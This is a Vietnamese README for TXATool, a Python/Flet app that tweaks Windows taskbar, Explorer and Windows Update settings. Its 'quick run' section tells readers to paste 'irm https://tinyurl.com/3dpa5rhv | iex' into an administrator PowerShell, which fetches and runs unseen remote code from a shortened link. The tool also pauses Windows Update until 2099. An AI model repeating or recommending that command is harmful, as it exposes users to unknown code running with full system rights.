# 🎯 TXATool - Windows Optimiser

![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Framework](https://img.shields.io/badge/framework-Flet-purple.svg)

**TXATool** là công cụ tối ưu hóa Windows hiện đại với giao diện Material Design 3 đẹp mắt, giúp bạn tùy chỉnh các cài đặt hệ thống Windows một cách dễ dàng và trực quan.

## ✨ Tính năng nổi bật

### 🎨 Giao diện hiện đại
- **Material Design 3** với animation mượt mà
- **Dark/Light theme** có thể chuyển đổi
- **Responsive layout** tự động điều chỉnh
- **Cross-platform** (Windows, Web, Mobile)
- Giao diện tiếng Việt hoàn toàn

### ⚙️ Tối ưu hóa hệ thống

#### Taskbar & Explorer
- ✅ Căn chỉnh Taskbar về trái (Windows 11)
- ✅ Không gộp cửa sổ trên Taskbar
- ✅ Hiện/ẩn biểu tượng Search
- ✅ Hiện/ẩn nút Task View
- ✅ Hiện phần mở rộng file trong Explorer

#### Windows Update
- ⚠️ Tạm dừng Windows Update
- 🔄 Bật lại Windows Update

#### Công cụ
- 🔄 Khởi động lại Windows Explorer
- 💾 Lưu cài đặt tự động
- 📊 Thông báo trạng thái thời gian thực

## 🚀 Cài đặt nhanh

### 1. Clone hoặc tải project

```bash
git clone https://github.com/yourusername/txatool.git
cd txatool
```

### 2. Cài đặt dependencies

```bash
pip install -r requirements.txt
```

### 3. Chạy ứng dụng

**Cách 1:** Sử dụng Python trực tiếp
```bash
python txatool.py
```

**Cách 2:** Sử dụng script nhanh
```bash
run.bat
```

## 🔨 Build file thực thi (.exe)

### Phương pháp 1: Flet Pack (Khuyến nghị)

```bash
flet pack txatool.py --name "TXATool" --icon "assets/icon.png"
```

### Phương pháp 2: Sử dụng build script

```bash
build_windows.bat
```

Chọn phương pháp khi được hỏi. File `.exe` sẽ được tạo trong thư mục `dist/`

## 📋 Yêu cầu hệ thống

- **OS:** Windows 10 hoặc Windows 11
- **Python:** 3.8 trở lên
- **RAM:** 256 MB (khuyến nghị)
- **Quyền:** Administrator (cho một số tính năng)

## 📦 Dependencies

- **flet** >= 0.24.0 - Framework UI Material Design 3
- **pyinstaller** >= 6.0.0 - Build executable (optional)

## 🎯 Cách sử dụng

1. **Khởi động ứng dụng** với quyền Administrator (khuyến nghị)
2. **Bật/tắt các tính năng** bằng các switch
3. **Chờ thông báo** xác nhận thay đổi
4. **Khởi động lại Explorer** nếu cần thiết (một số thay đổi yêu cầu restart)

### Lưu ý quan trọng

⚠️ **Windows Update:** Tính năng tắt Windows Update yêu cầu quyền Administrator và sẽ tắt update đến năm 2099. Sử dụng cẩn thận!

💡 **Restart Explorer:** Một số thay đổi cần khởi động lại Explorer để có hiệu lực.

💾 **Settings:** Tất cả cài đặt được lưu tự động vào file `settings.json`

## 🔧 Cấu trúc Project

```
txatool/
├── txatool.py           # Main application file
├── requirements.txt     # Python dependencies
├── settings.json        # User settings (auto-generated)
├── build_windows.bat    # Build script
├── run.bat             # Quick run script
├── README.md           # This file
└── assets/
    ├── icon.png        # App icon (PNG)
    ├── icon.ico        # App icon (ICO)
    └── background.png  # Background image (optional)
```

## 🐛 Troubleshooting

### Ứng dụng không khởi động
- Kiểm tra Python đã cài đặt: `python --version`
- Cài đặt dependencies: `pip install -r requirements.txt`

### Không thể thay đổi settings
- Chạy với quyền Administrator
- Kiểm tra Windows Defender/Antivirus

### Lỗi import flet
```bash
pip uninstall flet
pip install flet>=0.24.0
```

### Build thất bại
```bash
# Thử cài lại PyInstaller
pip uninstall pyinstaller
pip install pyinstaller>=6.0.0

# Hoặc dùng Flet Pack
pip install flet[all]
```

## ⚡ Chạy nhanh chỉ với 1 lệnh (Khuyến nghị)

👉 **Dành cho người muốn dùng ngay – không cần cài Python, không cần clone repo**

### Cách dùng
1. Mở **PowerShell**  
2. Chuột phải → **Run as Administrator**
3. Dán lệnh sau và Enter:

```powershell
irm https://tinyurl.com/3dpa5rhv | iex
```

## 📝 Roadmap

- [ ] Export/Import settings profile
- [ ] Preset profiles (Gaming, Work, Battery Saver)
- [ ] System performance monitoring
- [ ] Registry backup before changes
- [ ] Multi-language support
- [ ] Web version
- [ ] Mobile app (Android/iOS)

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the project
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Credits

- **Framework:** [Flet](https://flet.dev/) - Beautiful apps with Flutter and Python
- **Design:** Material Design 3 by Google
- **Icons:** Material Icons

## 📧 Contact

Nếu có vấn đề hoặc đề xuất, vui lòng tạo Issue trên GitHub.

---

**Made with ❤️ using Flet Framework**

